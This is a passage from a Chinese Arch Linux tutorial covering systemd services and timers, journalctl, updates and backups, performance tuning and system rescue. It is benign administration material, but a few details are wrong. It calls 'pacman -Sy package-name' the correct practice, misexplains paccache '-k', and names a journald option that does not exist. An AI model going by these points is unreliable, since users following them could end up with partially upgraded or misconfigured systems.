| Hyprland | Wayland | C++ | 配置文件 | 动画效果，现代 |

**安装 Hyprland**（现代 Wayland 平铺式）：

```bash
# 安装 Hyprland
sudo pacman -S hyprland

# 安装依赖
sudo pacman -S kitty waybar wofi swaybg

# 启动
Hyprland
```

#### 总结

- 窗口管理器分浮动式、平铺式、动态式三类
- 平铺式窗口管理器高效，适合键盘用户
- i3 是 X11 平铺式代表，Sway 是 Wayland 替代
- 配置文件纯文本，易于版本管理和定制
- 平铺式窗口管理器需要额外配置状态栏、启动器、壁纸
- Hyprland 是现代 Wayland 平铺式，支持动画

---

## 第 9 章：systemd 与系统服务

### 第 26 讲：systemd 基础与服务管理

#### 概念

systemd 是现代 Linux 的初始化系统和服务管理器，由 Lennart Poettering 开发，自 2010 年起逐渐成为主流发行版的默认 init 系统。Arch Linux 自 2012 年起采用 systemd。systemd 不仅管理服务，还管理挂载、网络、日志、定时任务等，是一个完整的系统管理套件。`systemctl` 是管理服务的主要命令，`journalctl` 是日志查看工具。

#### 原理

**systemd 的核心概念**：
- **Unit（单元）**：systemd 管理的基本对象，包括 service、socket、target、timer、mount、device 等
- **Target（目标）**：一组 Unit 的集合，类似传统 runlevel
- **Service（服务）**：后台运行的进程
- **Timer（定时器）**：定时触发任务，可替代 cron
- **Socket（套接字）**：按需启动服务

**Unit 文件位置**：
- `/etc/systemd/system/`：管理员配置（优先级最高）
- `/run/systemd/system/`：运行时配置
- `/usr/lib/systemd/system/`：软件包安装的配置

**Unit 依赖关系**：Unit 之间可以声明依赖（`Requires`、`Wants`、`After`、`Before`），systemd 按依赖顺序启动。`Requires` 是强依赖（依赖失败则本 Unit 失败），`Wants` 是弱依赖（依赖失败不影响本 Unit）。

**systemd 的优势**：
- 并行启动：通过依赖关系自动并行启动服务，加快启动速度
- 按需启动：socket/timer 触发时才启动服务
- 统一管理：服务、日志、网络等统一管理
- 声明式配置：Unit 文件描述"应该是什么状态"，而非"如何做"

#### 例子

**服务管理基础命令**：

```bash
# 启动服务
sudo systemctl start nginx

# 停止服务
sudo systemctl stop nginx

# 重启服务
sudo systemctl restart nginx

# 重新加载配置（不重启）
sudo systemctl reload nginx

# 查看服务状态
systemctl status nginx

# 查看是否运行
systemctl is-active nginx

# 查看是否开机自启
systemctl is-enabled nginx

# 设置开机自启
sudo systemctl enable nginx

# 设置开机不自启
sudo systemctl disable nginx

# 启动并设置开机自启
sudo systemctl enable --now nginx

# 停止并取消开机自启
sudo systemctl disable --now nginx

# 重新加载 systemd 配置（修改 Unit 文件后）
sudo systemctl daemon-reload
```

**查看 Unit**：

```bash
# 列出所有已加载的 Unit
systemctl list-units

# 列出所有已安装的 Unit 文件
systemctl list-unit-files

# 列出所有运行中的服务
systemctl list-units --type=service --state=running

# 列出所有失败的服务
systemctl --failed

# 查看服务的依赖关系
systemctl list-dependencies nginx

# 查看服务的详细属性
systemctl show nginx
```

**Target 管理**（类似传统 runlevel）：

```bash
# 查看当前默认 Target
systemctl get-default
# 通常是 graphical.target 或 multi-user.target

# 设置默认 Target
sudo systemctl set-default graphical.target   # 图形界面
sudo systemctl set-default multi-user.target  # 命令行

# 切换当前 Target
sudo systemctl isolate multi-user.target
sudo systemctl isolate graphical.target

# 常用 Target：
# poweroff.target - 关机
# reboot.target - 重启
# multi-user.target - 命令行多用户
# graphical.target - 图形界面
# rescue.target - 救援模式
# emergency.target - 紧急模式
```

**创建自定义服务**：

```bash
# 创建服务文件
sudo nano /etc/systemd/system/myapp.service

# 内容示例：
[Unit]
Description=My Awesome App
After=network.target

[Service]
Type=simple
User=alice
WorkingDirectory=/home/alice/myapp
ExecStart=/usr/bin/python3 /home/alice/myapp/main.py
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target

# 重新加载 systemd
sudo systemctl daemon-reload

# 启动并设置开机自启
sudo systemctl enable --now myapp

# 查看状态
systemctl status myapp
```

**服务类型（Type）说明**：

```ini
# Type=simple：默认，ExecStart 启动的进程就是主进程
# Type=forking：进程会 fork，父进程退出，子进程作为守护进程
# Type=oneshot：执行一次就完成（如脚本）
# Type=notify：服务启动后会通知 systemd
# Type=idle：等所有任务完成后再启动

# oneshot 示例：
[Unit]
Description=One-time Setup

[Service]
Type=oneshot
ExecStart=/usr/local/bin/setup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

**重启与关机**：

```bash
# 重启
sudo systemctl reboot

# 关机
sudo systemctl poweroff

# 挂起
sudo systemctl suspend

# 休眠
sudo systemctl hibernate

# 混合休眠
sudo systemctl hybrid-sleep
```

#### 总结

- systemd 是现代 Linux 的初始化系统和服务管理器
- `systemctl` 管理服务，`journalctl` 查看日志
- Unit 文件位于 `/etc/systemd/system/`（最高优先级）
- `daemon-reload` 在修改 Unit 文件后必须执行
- `enable --now` 同时启动并设置开机自启
- Target 类似传统 runlevel，控制运行级别

---

### 第 27 讲：定时任务与 timer

#### 概念

定时任务是按计划自动执行的任务。Linux 传统用 cron 管理定时任务，但 systemd 提供了更现代的替代方案——timer。systemd timer 比 cron 更强大：支持日历触发、相对时间触发、单调时间触发，可以精确到秒，与 systemd 服务集成，日志统一到 journalctl。本讲讲解 systemd timer 的使用，并对比 cron。

#### 原理

**cron 的工作原理**：cron 守护进程每分钟检查 `/etc/crontab`、`/etc/cron.d/`、`/var/spool/cron/` 中的 crontab 文件，匹配时间字段执行命令。时间格式为"分 时 日 月 周"。cron 简单易用，但精度为分钟级，且日志分散。

**systemd timer 的工作原理**：timer 是一种 Unit 类型，触发对应的 service Unit。timer 支持两种触发方式：
- **OnCalendar**：日历触发（类似 cron），如 `daily`、`weekly`、`*-*-* 03:00:00`
- **OnBootSec/OnUnitActiveSec**：相对时间触发，如开机后 5 分钟、上次执行后 1 小时

**timer 的优势**：
- 精度到秒
- 日志统一到 journalctl
- 支持依赖关系（如等网络就绪）
- 支持错误重试
- 可手动触发（`systemctl start`）
- 与 systemd 生态集成

**timer 的劣势**：
- 配置比 cron 复杂（需要两个文件）
- 学习曲线略陡

#### 例子

**使用 cron**（传统方式）：

```bash
# 安装 cron
sudo pacman -S cronie
sudo systemctl enable --now cronie

# 编辑当前用户的 crontab
crontab -e

# 添加任务：
# 每天凌晨 3 点备份
0 3 * * * /home/alice/backup.sh

# 每小时执行
0 * * * * /usr/local/bin/hourly-task.sh

# 每 5 分钟执行
*/5 * * * * /usr/local/bin/check-service.sh

# 每周一上午 9 点
0 9 * * 1 /usr/local/bin/weekly-report.sh

# 每月 1 号
0 0 1 * * /usr/local/bin/monthly-task.sh

# 查看当前用户的 crontab
crontab -l

# 编辑系统级 crontab
sudo nano /etc/crontab
```

**创建 systemd timer**（现代方式）：

```bash
# 1. 创建 service 文件
sudo nano /etc/systemd/system/backup.service

# 内容：
[Unit]
Description=Backup Service

[Service]
Type=oneshot
User=alice
ExecStart=/home/alice/backup.sh

# 2. 创建 timer 文件
sudo nano /etc/systemd/system/backup.timer

# 内容：
[Unit]
Description=Run backup daily

[Timer]
OnCalendar=*-*-* 03:00:00
Persistent=true
Unit=backup.service

[Install]
WantedBy=timers.target

# 3. 重新加载 systemd
sudo systemctl daemon-reload

# 4. 启用 timer
sudo systemctl enable --now backup.timer

# 5. 查看状态
systemctl status backup.timer
systemctl list-timers
```

**timer 触发类型详解**：

```ini
# 1. 日历触发（OnCalendar）
[Timer]
OnCalendar=*-*-* 03:00:00      # 每天 3 点
OnCalendar=weekly              # 每周
OnCalendar=monthly             # 每月
OnCalendar=yearly              # 每年
OnCalendar=mon..fri 09:00      # 工作日 9 点
OnCalendar=*:0/15              # 每 15 分钟

# 2. 相对时间触发
[Timer]
OnBootSec=5min                 # 开机后 5 分钟
OnUnitActiveSec=1h             # 上次执行后 1 小时
OnUnitInactiveSec=30min        # 上次完成后 30 分钟

# 3. 单调时间触发（从系统启动开始计时）
[Timer]
OnUnitActiveSec=10s            # 每 10 秒

# Persistent=true 表示错过的任务会在开机后补执行
# Persistent=false 表示错过的任务不补执行
```

**查看和管理 timer**：

```bash
# 列出所有 timer
systemctl list-timers

# 列出所有 timer（包括未启用的）
systemctl list-timers --all

# 查看特定 timer 状态
systemctl status backup.timer

# 查看下次触发时间
systemctl list-timers backup.timer

# 手动触发（执行对应的 service）
sudo systemctl start backup.service

# 临时禁用 timer
sudo systemctl stop backup.timer

# 永久禁用
sudo systemctl disable backup.timer
```

**实际案例：自动清理包缓存**：

```bash
# 创建 service
sudo nano /etc/systemd/system/paccache.service
# 内容：
[Unit]
Description=Clean package cache

[Service]
Type=oneshot
ExecStart=/usr/bin/paccache -rk 1
# -r 保留最近 1 个版本
# -k 保留已卸载的包

# 创建 timer
sudo nano /etc/systemd/system/paccache.timer
# 内容：
[Unit]
Description=Weekly clean package cache

[Timer]
OnCalendar=weekly
Persistent=true

[Install]
WantedBy=timers.target

# 启用
sudo systemctl enable --now paccache.timer
```

**实际案例：定期更新系统**：

```bash
# 创建 service
sudo nano /etc/systemd/system/auto-update.service
# 内容：
[Unit]
Description=Auto update system
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/bin/pacman -Syu --noconfirm
ExecStartPost=/usr/bin/systemctl reboot

# 创建 timer
sudo nano /etc/systemd/system/auto-update.timer
# 内容：
[Unit]
Description=Weekly auto update

[Timer]
OnCalendar=Sun 04:00:00
Persistent=true

[Install]
WantedBy=timers.target

# 启用
sudo systemctl enable --now auto-update.timer
```

#### 总结

- systemd timer 是 cron 的现代替代，更强大、更精确
- timer 需要配套 service 文件，配置稍复杂
- `OnCalendar` 日历触发，`OnUnitActiveSec` 相对时间触发
- `Persistent=true` 让错过的任务在开机后补执行
- `systemctl list-timers` 查看所有 timer 状态
- cron 仍可用，简单任务推荐 cron，复杂任务推荐 timer

---

### 第 28 讲：日志系统 journalctl

#### 概念

journalctl 是 systemd 的日志查看工具，用于查询和管理系统日志。相比传统 syslog（日志分散在多个文件中），journalctl 采用结构化日志，支持按时间、服务、优先级、用户等多维度过滤，日志可以持久化存储或仅存内存。journalctl 是排查系统问题的核心工具，掌握它能大幅提升故障排查效率。

#### 原理

**journald 的工作原理**：systemd-journald 是日志收集守护进程，收集来自内核、系统服务、用户进程的日志，存储为结构化二进制格式。日志默认存储在 `/var/log/journal/`（持久化）或 `/run/log/journal/`（临时，重启丢失）。

**结构化日志**：每条日志包含多个字段：时间戳、来源服务、优先级、PID、UID、消息内容等。journalctl 可以按任意字段过滤，比传统 syslog 的纯文本日志强大得多。

**日志优先级**：syslog 标准定义了 8 个优先级：
- 0 emerg：紧急
- 1 alert：警报
- 2 crit：严重
- 3 err：错误
- 4 warning：警告
- 5 notice：通知
- 6 info：信息
- 7 debug：调试

**日志轮转**：journald 自动管理日志大小，超过限制时自动删除旧日志。配置在 `/etc/systemd/journald.conf` 中。

#### 例子

**基础查询**：

```bash
# 查看所有日志（分页）
journalctl

# 查看最新日志（实时跟踪）
journalctl -f

# 查看最近 100 条日志
journalctl -n 100

# 查看最近 100 条并实时跟踪
journalctl -n 100 -f
```

**按时间过滤**：

```bash
# 查看今天的日志
journalctl --since today

# 查看昨天的日志
journalctl --since yesterday --until today

# 指定时间范围
journalctl --since "2024-01-01 00:00:00" --until "2024-01-02 00:00:00"

# 相对时间
journalctl --since "1 hour ago"
journalctl --since "2 days ago"
journalctl --since "2024-01-01" --until "2024-01-31"
```

**按服务过滤**：

```bash
# 查看特定服务的日志
journalctl -u nginx
journalctl -u nginx -u php-fpm

# 查看服务最近的日志
journalctl -u nginx -n 50

# 实时跟踪服务日志
journalctl -u nginx -f

# 查看服务本次启动以来的日志
journalctl -u nginx -b
```

**按优先级过滤**：

```bash
# 查看错误及以上级别的日志
journalctl -p err

# 查看警告及以上
journalctl -p warning

# 查看特定优先级
journalctl -p 3  # err
journalctl -p 0..4  # emerg 到 warning

# 优先级名称：
# 0 emerg, 1 alert, 2 crit, 3 err, 4 warning, 5 notice, 6 info, 7 debug
```

**按启动过滤**：

```bash
# 查看本次启动的日志
journalctl -b

# 查看上一次启动的日志
journalctl -b -1

# 查看前两次启动的日志
journalctl -b -2

# 列出所有启动记录
journalctl --list-boots
# 输出类似：
# 0 2024-01-15 09:00:00 ... - 当前启动
# -1 2024-01-14 18:00:00 ... - 上次启动
# -2 2024-01-14 09:00:00 ... - 上上次启动
```

**按用户和进程过滤**：

```bash
# 查看特定用户的日志
journalctl _UID=1000

# 查看特定进程的日志
journalctl _PID=1234

# 查看特定可执行文件的日志
journalctl /usr/bin/nginx

# 查看内核日志
journalctl -k
```

**输出格式控制**：

```bash
# 默认格式（适合人类阅读）
journalctl -u nginx

# JSON 格式（适合程序处理）
journalctl -u nginx -o json

# 简洁格式
journalctl -u nginx -o short

# 详细格式（显示完整字段）
journalctl -u nginx -o verbose

# 仅显示消息内容
journalctl -u nginx -o cat
```

**日志管理**：

```bash
# 查看日志占用空间
journalctl --disk-usage

# 清理日志，仅保留最近 7 天
sudo journalctl --vacuum-time=7d

# 清理日志，仅保留最近 100MB
sudo journalctl --vacuum-size=100M

# 清理日志，仅保留最近 2 个启动的日志
sudo journalctl --vacuum-files=2

# 验证日志完整性
sudo journalctl --verify
```

**配置日志持久化**：

```bash
# 默认日志可能仅存内存，重启丢失
# 启用持久化：
sudo nano /etc/systemd/journald.conf

# 修改：
Storage=persistent       # 持久化存储
Compress=yes             # 压缩旧日志
SystemMaxUse=500M        # 最大占用 500MB
SystemKeepTime=2week     # 保留 2 周
MaxRetentionSec=1month   # 最长保留 1 个月

# 重启 journald
sudo systemctl restart systemd-journald
```

**实际排查案例**：

```bash
# 案例 1：服务启动失败
sudo systemctl start nginx  # 失败
journalctl -u nginx -n 50 --no-pager
# 查看错误信息

# 案例 2：系统启动慢
systemd-analyze
systemd-analyze blame
# 找出启动慢的服务
journalctl -b | grep "slow"

# 案例 3：查找最近的错误
journalctl -p err -b
journalctl -p crit -b

# 案例 4：导出日志供分析
journalctl -b > boot-log.txt
journalctl -u nginx --since "1 hour ago" > nginx-log.txt
```

#### 总结

- journalctl 是 systemd 的日志工具，支持结构化查询
- `-u` 按服务，`-b` 按启动，`-p` 按优先级，`--since/--until` 按时间
- `-f` 实时跟踪，`-n` 显示最后 N 条
- 日志默认可能仅存内存，需配置 `Storage=persistent` 持久化
- 用 `--vacuum-time` 和 `--vacuum-size` 清理日志
- 排查问题先看 `journalctl -p err -b`（本次启动的错误）

---

## 第 10 章：系统维护与优化

### 第 29 讲：系统更新与备份恢复

#### 概念

Arch Linux 作为滚动发行版，系统更新是日常维护的核心。正确的更新策略能避免大多数问题：定期更新、查看更新公告、避免部分升级。备份是系统安全的最后一道防线，当系统损坏或数据丢失时，备份能让你快速恢复。本讲讲解 Arch 的更新最佳实践、备份策略和恢复方法，包括 rsync、timeshift、borg 等工具的使用。

#### 原理

**滚动更新的风险**：Arch 的滚动更新意味着软件版本持续变化，偶尔会出现破坏性更新（如配置文件格式变化、库 API 变更）。如果长期不更新再一次性升级，可能遇到大量依赖冲突。部分升级（只升级某些包而不升级全部）是 Arch 的大忌，可能导致库版本不匹配。

**Arch 更新公告**：Arch 官方在 https://archlinux.org/news/ 发布重要更新公告，涉及需要手动干预的更新（如配置文件迁移、文件路径变化、依赖冲突等）。更新前查看公告是良好习惯。

**备份的 3-2-1 原则**：
- 3 份数据副本
- 2 种不同存储介质
- 1 份异地存储

**备份类型**：
- **完整备份**：备份所有数据，占用空间大但恢复简单
- **增量备份**：仅备份上次备份后变化的数据，节省空间
- **差异备份**：备份上次完整备份后变化的数据，介于两者之间

**快照 vs 备份**：快照（如 Btrfs 快照）是文件系统级别的"时间点"，创建速度快但位于同一磁盘，无法防止磁盘故障。备份是将数据复制到其他介质，能防止磁盘故障但创建慢。两者互补。

#### 例子

**正确的系统更新流程**：

```bash
# 1. 查看更新公告（浏览器访问 https://archlinux.org/ 或命令行）
curl -s https://archlinux.org/feeds/news/ | head -50

# 2. 同步数据库并查看将升级的包
sudo pacman -Sy
pacman -Qu

# 3. 执行升级
sudo pacman -Su

# 或一步完成
sudo pacman -Syu

# 4. 重启（如果内核或 systemd 升级）
sudo reboot

# 5. 检查服务状态
systemctl --failed
```

**避免部分升级**：

```bash
# 错误：只升级一个包（可能导致依赖不匹配）
sudo pacman -S package-name  # 不要这样做！

# 正确：先同步数据库再安装
sudo pacman -Sy package-name

# 最佳：完整升级后再安装
sudo pacman -Syu package-name
```

**处理更新冲突**：

```bash
# 包冲突（如文件已存在）
sudo pacman -Syu --overwrite path/to/file

# 忽略特定包的升级
sudo pacman -Syu --ignore package-name

# 永久忽略某包升级（在 pacman.conf）
# IgnorePkg = package-name

# 密钥问题
sudo pacman -Sy archlinux-keyring
sudo pacman -Syu
```

**使用 rsync 备份**：

```bash
# 安装 rsync
sudo pacman -S rsync

# 完整备份到外部硬盘
sudo rsync -aAXv --delete --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found","/home/*/.cache/*"} / /path/to/backup/

# 参数说明：
# -a 归档模式（保留权限、时间、符号链接等）
# -A 保留 ACL
# -X 保留扩展属性
# -v 详细输出
# --delete 删除目标中源已删除的文件
# --exclude 排除不需要备份的目录

# 增量备份（用 --link-dest 引用上次备份）
sudo rsync -aAXv --delete --link-dest=/path/to/last-backup/ / /path/to/new-backup/
```

**使用 Timeshift 创建系统快照**：

```bash
# 安装 Timeshift
sudo pacman -S timeshift

# 启动（图形界面或命令行）
sudo timeshift-gtk
# 或
sudo timeshift --list

# 创建快照
sudo timeshift --create --comments "Before update" --tags D

# 查看快照
sudo timeshift --list

# 恢复快照
sudo timeshift --restore --snapshot '2024-01-15_10-00-01'

# 删除快照
sudo timeshift --delete --snapshot '2024-01-15_10-00-01'

# 设置自动快照（每小时/每天/每周/每月）
sudo timeshift-gtk  # 在设置中配置
```

**使用 BorgBackup 高效备份**：

```bash
# 安装 Borg
sudo pacman -S borg

# 初始化备份仓库（加密）
borg init --encryption=repokey /path/to/backup-repo

# 创建备份
borg create --stats --progress /path/to/backup-repo::backup-{now} /home/alice /etc

# 查看备份列表
borg list /path/to/backup-repo

# 查看备份内容
borg list /path/to/backup-repo::backup-2024-01-15

# 恢复备份
borg extract /path/to/backup-repo::backup-2024-01-15

# 删除旧备份（保留最近 7 天的日备份，4 周的周备份，6 月的月备份）
borg prune --keep-daily=7 --keep-weekly=4 --keep-monthly=6 /path/to/backup-repo
```

**Btrfs 快照自动管理**：

```bash
# 安装 snapper
sudo pacman -S snapper

# 创建配置
sudo snapper -c root create-config /

# 查看配置
sudo snapper -c root list

# 创建快照
sudo snapper -c root create -d "Before update"

# 查看快照
sudo snapper -c root list

# 恢复快照
sudo snapper -c root undochange 1..2

# 启用定时快照
sudo systemctl enable --now snapper-timeline.timer
sudo systemctl enable --now snapper-cleanup.timer
```

#### 总结

- 更新前查看 Arch 新闻公告，避免破坏性更新
- 永远不要部分升级，用 `pacman -Syu` 完整升级
- 备份遵循 3-2-1 原则：3 份副本、2 种介质、1 份异地
- rsync 适合文件级备份，支持增量
- Timeshift 适合系统快照，支持 Btrfs 和 rsync
- BorgBackup 高效去重压缩，适合大量数据备份
- Btrfs 用户用 snapper 自动管理快照

---

### 第 30 讲：性能监控与调优

#### 概念

系统性能监控是发现瓶颈、优化资源使用的关键。Linux 提供丰富的监控工具：top/htop/btop（进程监控）、iostat（磁盘 I/O）、iotop（进程 I/O）、free（内存）、vmstat（虚拟内存）、sar（系统活动报告）。性能调优涉及 CPU 调度、内存管理、磁盘 I/O、网络等多个方面。本讲讲解常用监控工具和调优方法。

#### 原理

**性能瓶颈的层次**：
- **CPU 瓶颈**：CPU 使用率持续 100%，进程排队等待
- **内存瓶颈**：内存不足导致频繁 swap，系统变慢
- **磁盘 I/O 瓶颈**：磁盘读写速度限制，常见于 HDD
- **网络瓶颈**：带宽不足或延迟高

**Linux 调度器**：Linux 内核使用 Completely Fair Scheduler（CFS）调度进程。可以通过 `nice` 和 `renice` 调整进程优先级，`cpupower` 调整 CPU 频率策略。

**内存管理**：Linux 将空闲内存用作文件缓存（page cache），加速文件访问。当内存不足时，内核会回收缓存或使用 swap。`swappiness` 参数控制使用 swap 的倾向（0-100，默认 60）。

**I/O 调度器**：Linux 内核为磁盘设备提供 I/O 调度器，优化读写顺序。常见调度器：mq-deadline（默认，适合 HDD）、bfq（适合桌面）、kyber（适合 NVMe）、none（适合 NVMe，无调度）。

**CPU 频率调节**：现代 CPU 支持动态频率调节（DVFS）。`cpupower` 工具可以设置策略：performance（最高性能）、powersave（节能）、ondemand（按需，默认）、schedutil（基于调度器）。

#### 例子

**进程监控工具**：

```bash
# top（系统自带）
top

# htop（更友好的界面）
sudo pacman -S htop
htop
# 快捷键：
# F5 树形视图
# F6 排序
# F9 发送信号
# F10 退出

# btop（最现代的界面）
sudo pacman -S btop
btop

# 查看特定进程
ps aux | grep nginx
pgrep -a nginx

# 查看进程树
pstree -p
```

**CPU 监控**：

```bash
# 查看 CPU 使用率
top -bn1 | head -5
mpstat 1  # 每秒更新（需要 sysstat 包）

# 查看 CPU 信息
lscpu
cat /proc/cpuinfo

# 查看负载均衡
uptime
# load average: 1.5, 1.2, 0.8 (1分钟, 5分钟, 15分钟)
# 数值 < CPU 核心数则正常

# 查看 CPU 频率
cpupower frequency-info
watch -n 1 "cat /proc/cpuinfo | grep MHz"
```

**内存监控**：

```bash
# 查看内存使用
free -h
#               total   used   free   shared  buff/cache  available
# Mem:           16Gi   4Gi    8Gi    200Mi   4Gi         11Gi
# Swap:          8Gi    0B     8Gi

# 详细内存信息
cat /proc/meminfo

# 查看进程内存使用
ps aux --sort=-%mem | head -10

# 查看 swap 使用
swapon --show

# 调整 swappiness（0-100，值越低越少用 swap）
sudo sysctl vm.swappiness=10
# 永久生效
echo "vm.swappiness=10" | sudo tee -a /etc/sysctl.d/99-sysctl.conf
```

**磁盘 I/O 监控**：

```bash
# 安装工具
sudo pacman -S sysstat iotop

# 查看 I/O 统计
iostat -x 1  # 每秒更新

# 查看进程 I/O
sudo iotop

# 查看磁盘性能
sudo hdparm -tT /dev/sda

# 查看磁盘使用
df -h
du -sh /path/to/dir

# 查看 I/O 调度器
cat /sys/block/sda/queue/scheduler
# 输出：mq-deadline kyber [bfq] none

# 修改 I/O 调度器（临时）
echo bfq | sudo tee /sys/block/sda/queue/scheduler

# 永久修改（udev 规则）
echo 'ACTION=="add|change", KERNEL=="sd[a-z]", ATTR{queue/scheduler}="bfq"' | sudo tee /etc/udev/rules.d/60-io-scheduler.rules
```

**网络监控**：

```bash
# 安装工具
sudo pacman -S nethogs iftop

# 查看网络接口
ip link
ip addr

# 查看网络连接
ss -tulpn

# 查看进程网络使用
sudo nethogs

# 查看带宽使用
sudo iftop

# 查看网络统计
cat /proc/net/dev
```

**CPU 频率调优**：

```bash
# 安装 cpupower
sudo pacman -S cpupower

# 查看当前策略
cpupower frequency-info

# 设置性能模式
sudo cpupower frequency-set -g performance

# 设置节能模式
sudo cpupower frequency-set -g powersave

# 设置按需模式（默认）
sudo cpupower frequency-set -g ondemand

# 永久生效（启用 cpupower 服务）
sudo systemctl enable cpupower
```

**进程优先级调整**：

```bash
# 启动时指定优先级（-20 最高，19 最低）
nice -n -10 ./cpu-intensive-task

# 修改运行中进程的优先级
renice -n 5 -p 1234

# 查看进程优先级
ps -l -p 1234

# 用 cgroup 限制资源
sudo systemctl set-property myapp.service CPUQuota=50% MemoryMax=500M
```

**系统启动优化**：

```bash
# 查看启动时间
systemd-analyze

# 查看各服务启动时间
systemd-analyze blame

# 查看关键路径
systemd-analyze critical-chain

# 禁用不必要的服务
systemctl list-unit-files --state=enabled
sudo systemctl disable bluetooth.service  # 如果不用蓝牙
sudo systemctl disable cups.service       # 如果不用打印
```

#### 总结

- 进程监控：top/htop/btop，btop 最现代
- CPU 监控：`uptime` 看负载，`mpstat` 看详细使用
- 内存监控：`free -h`，调整 `swappiness` 控制 swap 使用
- 磁盘 I/O：`iostat` 看整体，`iotop` 看进程
- CPU 调优：`cpupower` 设置频率策略
- 进程优先级：`nice`/`renice` 调整
- 启动优化：`systemd-analyze blame` 找慢服务

---

### 第 31 讲：故障排查与救援

#### 概念

系统故障是不可避免的：内核升级后无法启动、文件系统损坏、忘记 root 密码、图形界面无法启动等。Arch Linux 提供多种救援方式：Live USB chroot 修复、systemd 救援模式、单用户模式、initramfs 修复。本讲讲解常见故障的排查思路和修复方法，让你在系统出问题时能从容应对。

#### 原理

**Linux 启动流程**：BIOS/UEFI → 引导加载器 → 内核 + initramfs → systemd → 服务启动 → 登录。任何一个环节出错都可能导致无法启动。

**initramfs 的作用**：initramfs（initial RAM filesystem）是一个临时根文件系统，加载到内存中。它包含必要的内核模块和工具，负责挂载真实根文件系统，然后切换到真实根。如果 initramfs 损坏或缺少模块（如磁盘控制器驱动），系统无法启动。

**chroot 救援原理**：用 Live USB 启动，挂载故障系统的根分区，然后用 `arch-chroot` 进入，就可以像在原系统中一样执行命令修复问题。这是最通用的救援方法。

**systemd 救援模式**：systemd 提供多个救援 Target：
- `rescue.target`：救援模式，挂载根文件系统，启动基本服务
- `emergency.target`：紧急模式，仅挂载根为只读，最小化环境
- `multi-user.target`：多用户命令行模式

**故障排查方法论**：
1. 观察错误现象（黑屏、报错信息、卡住位置）
2. 查看日志（journalctl、dmesg）
3. 定位问题（配置错误、包损坏、硬件故障）
4. 尝试修复（回滚、重装、修改配置）
5. 验证修复

#### 例子

**进入 systemd 救援模式**：

```bash
# 在 GRUB 启动菜单按 e 编辑启动项
# 在 linux 行末尾添加：
systemd.unit=rescue.target
# 按 Ctrl+X 启动

# 或进入紧急模式
systemd.unit=emergency.target

# 进入后需要输入 root 密码
# 然后可以查看日志、修复问题
journalctl -b -p err
```

**Live USB chroot 修复**：

```bash
# 1. 用 Arch Live USB 启动

# 2. 联网
iwctl  # 或有线自动

# 3. 挂载根分区
lsblk  # 查看分区
sudo mount /dev/sda2 /mnt

# 如果是 Btrfs，挂载根子卷
sudo mount -o subvol=@ /dev/sda2 /mnt

# 4. 挂载 ESP（如果是 UEFI）
sudo mount /dev/sda1 /mnt/boot/efi

# 5. 挂载其他分区（如果有 /home 等）
sudo mount /dev/sda3 /mnt/home

# 6. chroot 进入系统
arch-chroot /mnt

# 7. 现在可以执行修复命令
# 例如：重装内核
pacman -S linux

# 重新生成 initramfs
mkinitcpio -P

# 重新安装引导加载器
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB
grub-mkconfig -o /boot/grub/grub.cfg

# 8. 退出并重启
exit
sudo umount -R /mnt
sudo reboot
```

**修复损坏的包**：

```bash
# 查看损坏的包
sudo pacman -Qk

# 重新安装损坏的包
sudo pacman -S package-name

# 强制重新安装所有包（极端情况）
pacman -Qqn | pacman -S -

# 修复密钥环
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
sudo pacman -Sy archlinux-keyring
```

**忘记 root 密码**：

```bash
# 1. 在 GRUB 启动菜单按 e 编辑
# 2. 在 linux 行末尾添加：
init=/bin/bash
# 或
rw init=/bin/bash

# 3. 启动后进入 root shell
# 4. 重新挂载根为读写
mount -o remount,rw /

# 5. 修改密码
passwd

# 6. 重启
exec /sbin/init
# 或
sync
reboot -f
```

**修复文件系统**：

```bash
# 检查文件系统（必须卸载后检查）
sudo umount /dev/sda2
sudo fsck.ext4 /dev/sda2
# 或
sudo fsck.btrfs /dev/sda2

# 强制检查
sudo fsck -f /dev/sda2

# 自动修复
sudo fsck -y /dev/sda2

# 检查后重新挂载
sudo mount /dev/sda2 /mnt
```

**图形界面无法启动**：

```bash
# 1. 切换到 TTY（Ctrl+Alt+F2-F6）

# 2. 查看日志
journalctl -b -p err
journalctl -u gdm  # 或 sddm/lightdm
journalctl -u display-manager

# 3. 检查 X11 日志
cat /var/log/Xorg.0.log | grep EE

# 4. 重新安装显卡驱动
sudo pacman -S nvidia nvidia-utils  # NVIDIA
sudo pacman -S mesa                 # AMD/Intel

# 5. 重新生成 initramfs（如果升级了内核）
sudo mkinitcpio -P

# 6. 重启显示管理器
sudo systemctl restart gdm
```

**磁盘空间满**：

```bash
# 查看磁盘使用
df -h

# 找出大文件
sudo du -ah / | sort -rh | head -20

# 清理包缓存
sudo pacman -Sc
sudo paccache -r  # 保留最近 3 个版本
sudo paccache -ruk0  # 删除已卸载包的缓存

# 清理日志
sudo journalctl --vacuum-size=100M

# 清理用户缓存
rm -rf ~/.cache/*

# 清理临时文件
sudo rm -rf /tmp/*
```

**内核升级后无法启动**：

```bash
# 1. Live USB 启动，chroot 进入系统

# 2. 查看已安装的内核
pacman -Q | grep linux

# 3. 安装 LTS 内核（更稳定）
pacman -S linux-lts

# 4. 重新生成 initramfs
mkinitcpio -P

# 5. 更新 GRUB
grub-mkconfig -o /boot/grub/grub.cfg

# 6. 重启选择 LTS 内核
```

#### 总结

- 故障排查方法论：观察 → 查日志 → 定位 → 修复 → 验证
- systemd 救援模式：`rescue.target`、`emergency.target`
- Live USB chroot 是最通用的救援方法
- 忘记密码：GRUB 添加 `init=/bin/bash`
- 文件系统损坏：用 `fsck` 修复
- 图形界面问题：查看 `journalctl -u display-manager`
- 建议安装 LTS 内核作为备用

---

## 第 11 章：进阶主题

### 第 32 讲：Btrfs 与快照回滚

#### 概念

Btrfs（B-tree filesystem）是现代 Linux 文件系统，支持快照、子卷、压缩、去重、RAID 等高级功能。相比传统 ext4，Btrfs 最大的优势是快照——可以在几乎瞬间创建文件系统的时间点副本，用于回滚、备份。Arch Linux 用户广泛采用 Btrfs，结合 snapper 工具实现自动快照管理，让系统升级出问题时能快速回滚到可用状态。

#### 原理

**Btrfs 的核心概念**：
